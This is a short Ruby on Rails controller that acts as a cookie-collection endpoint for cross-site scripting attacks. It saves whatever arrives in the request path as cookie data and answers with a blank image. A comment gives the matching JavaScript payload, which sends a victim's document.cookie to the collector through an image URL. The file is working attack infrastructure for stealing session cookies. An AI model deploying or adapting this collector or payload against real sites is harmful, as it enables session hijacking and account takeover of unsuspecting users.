class CookieCollectorController < ApplicationController

	def empty_img

		en_cookie = request.env['REQUEST_PATH'].split('/')[-1]


		#respond_to do |format|
#			format.any { render :text => en_cookie }
		#end
		#return

		#example
		#var i = document.createElement('img');i.src = 'http://127.0.0.1:3000/cookie_collector/noname/' + encodeURIComponent(document.cookie).replace(/\./g, '&#46;') + '.png';document.body.appendChild(i);
		

		# dont get from params[:cook]
		#CookieHistory.new( cookie_data: params[:cook] ).save
		CookieHistory.new( cookie_data: en_cookie ).save


		path = Rails.root.join("app", "assets", "images", 'a.png').to_s
		respond_to do |format|
			format.any { render :text => open(path, "rb").read }
		end
	end
end
